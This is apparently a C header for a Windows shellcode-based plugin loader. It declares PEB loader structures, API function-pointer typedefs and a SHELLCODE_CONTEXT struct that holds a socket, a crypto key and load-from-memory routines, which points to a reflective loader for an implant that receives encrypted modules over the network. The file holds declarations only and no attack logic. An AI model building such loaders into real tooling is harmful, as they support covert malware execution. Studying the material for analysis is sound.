typedef struct _PEB_LDR_DATA{
    ULONG               Length;
    BOOLEAN             Initialized;
    PVOID               SsHandle;
    LIST_ENTRY          InLoadOrderModuleList;
    LIST_ENTRY          InMemoryOrderModuleList;
    LIST_ENTRY          InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _UNICODE_STRING {
    USHORT              Length;
    USHORT              MaximumLength;
    PWSTR               Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_MODULE {
    LIST_ENTRY          InLoadOrderLinks;
    LIST_ENTRY          InMemoryOrderLinks;
    LIST_ENTRY          InInitializationOrderLinks;
    PVOID               DllBase;
    PVOID               EntryPoint;
    ULONG               SizeOfImage;
    UNICODE_STRING      FullDllName;
    UNICODE_STRING      BaseDllName;
    ULONG               Flags;
    WORD                LoadCount;
    WORD                TlsIndex;
    PVOID               SectionPointer;
    ULONG               CheckSum;
    ULONG               TimeDateStamp;
} LDR_MODULE, *PLDR_MODULE;

typedef struct {
	PIMAGE_NT_HEADERS   headers;
	unsigned char       *codeBase;
	HMODULE             *modules;
	int                 numModules;
    PLDR_MODULE         ldr_mod;
} MEMORYMODULE, *PMEMORYMODULE;

//ntdll.dll
typedef LPVOID (WINAPI *_RtlReAllocateHeap)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
typedef LPVOID (WINAPI *_RtlAllocateHeap)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
typedef BOOLEAN (WINAPI *_RtlFreeHeap)(PVOID HeapHandle, ULONG Flags, PVOID HeapBase);
typedef LPVOID (__cdecl *_memcpy)(void *, const void *, size_t);
typedef LPVOID (__cdecl *_memset)(void *, int, size_t);
//kernel32.dll
typedef HMODULE (WINAPI *_LoadLibraryA)(LPCTSTR lpFileName);
typedef BOOL (WINAPI *_FreeLibrary)(HMODULE hModule);
typedef FARPROC (WINAPI *_GetProcAddress)(HMODULE hModule, LPCTSTR lpProcName);
typedef BOOL (WINAPI *_VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef HANDLE (WINAPI *_GetProcessHeap)(void);
typedef BOOL (WINAPI *_IsBadReadPtr)(const VOID *lp, UINT_PTR ucb);
typedef LPVOID (WINAPI *_VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL (WINAPI *_VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef BOOL (WINAPI *_VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef DWORD (WINAPI *_TlsAlloc)(void);
typedef BOOL (WINAPI *_TlsFree)(DWORD dwTlsIndex);
typedef BOOL (WINAPI *_TlsSetValue)(DWORD dwTlsIndex,LPVOID lpTlsValue);
typedef LPVOID (WINAPI *_TlsGetValue)(DWORD dwTlsIndex);
//ws2_32.dll
typedef int (WINAPI *_recv)(SOCKET s, char *buf, int len, int flags);
typedef int (WINAPI *_send)(SOCKET s, const char *buf, int len, int flags);
//advapi32.dll
typedef BOOL (WINAPI *_CryptDecrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen);
typedef BOOL (WINAPI *_CryptEncrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE *pbData, DWORD *pdwDataLen, DWORD dwBufLen);
//msvcrt.dll
typedef void * (__cdecl *_malloc)(size_t _Size);
typedef void (__cdecl *_free)(void *memblock);

//typedef int (__stdcall *LoadLibraryFromMemory_)(PSHELLCODE_CONTEXT pSCC, const void *data, LPCWSTR dllname, PMEMORYMODULE result);
//typedef void (__stdcall *FreeLibraryFromMemory_)(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module);

typedef struct SHELLCODE_CONTEXT{
    HMODULE                         NTDLL;
    _memcpy                         memcpy_;
    _memset                         memset_;
    _RtlReAllocateHeap              RtlReAllocateHeap_;
    _RtlAllocateHeap                RtlAllocateHeap_;
    _RtlFreeHeap                    RtlFreeHeap_;
    HMODULE                         KERNEL32;
    _LoadLibraryA                   LoadLibraryA_;
    _FreeLibrary                    FreeLibrary_;
    _GetProcAddress                 GetProcAddressA_;
    _GetProcessHeap                 GetProcessHeap_;
    _IsBadReadPtr                   IsBadReadPtr_;
    _VirtualAlloc                   VirtualAlloc_;
    _VirtualFree                    VirtualFree_;
    _VirtualProtect                 VirtualProtect_;
    _TlsAlloc                       TlsAlloc_;
    _TlsFree                        TlsFree_;
    _TlsSetValue                    TlsSetValue_;
    _TlsGetValue                    TlsGetValue_;
    HMODULE                         WS2_32;
    _recv                           recv_;
    _send                           send_;
    HMODULE                         ADVAPI32;
    _CryptDecrypt                   CryptDecrypt_;
    _CryptEncrypt                   CryptEncrypt_;
    HMODULE                         MSVCRT;
    _malloc                         malloc__;
    _free                           free_;
    /**/
    SOCKET                          hSocket;
    HCRYPTKEY                       hKey;
    /*LoadLibraryFromMemory_*/PVOID LLFM;
    /*FreeLibraryFromMemory_*/PVOID FLFM;
    DWORD                           delta;
}SHELLCODE_CONTEXT,*PSHELLCODE_CONTEXT;

typedef int (WINAPI *InitPluginLoader)(PSHELLCODE_CONTEXT pSCC);

typedef BOOL (WINAPI *DllEntryProc)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);

#define GET_HEADER_DICTIONARY(module, idx)	&(module)->headers->OptionalHeader.DataDirectory[idx]

#define LDR_IMAGE_IS_DLL            0x00000004
#define LDR_NO_DLL_CALLS            0x00040000
#define LDR_PROCESS_ATTACHED        0x00080000
#define LDR_MODULE_REBASED          0x00200000

#define LDR_STATIC_LINK             0x0000002
#define LDR_IMAGE_DLL               0x0000004
#define LDR_LOAD_IN_PROGRESS        0x0001000
#define LDR_UNLOAD_IN_PROGRESS      0x0002000
#define LDR_ENTRY_PROCESSED         0x0004000
#define LDR_ENTRY_INSERTED          0x0008000
#define LDR_CURRENT_LOAD            0x0010000
#define LDR_FAILED_BUILTIN_LOAD     0x0020000
#define LDR_DONT_CALL_FOR_THREADS   0x0040000
#define LDR_PROCESS_ATTACH_CALLED   0x0080000
#define LDR_DEBUG_SYMBOLS_LOADED    0x0100000
#define LDR_IMAGE_NOT_AT_BASE       0x0200000
#define LDR_WX86_IGNORE_MACHINETYPE 0x0400000

/* these ones is Wine specific */
#define LDR_DONT_RESOLVE_REFS       0x40000000
#define LDR_WINE_INTERNAL           0x80000000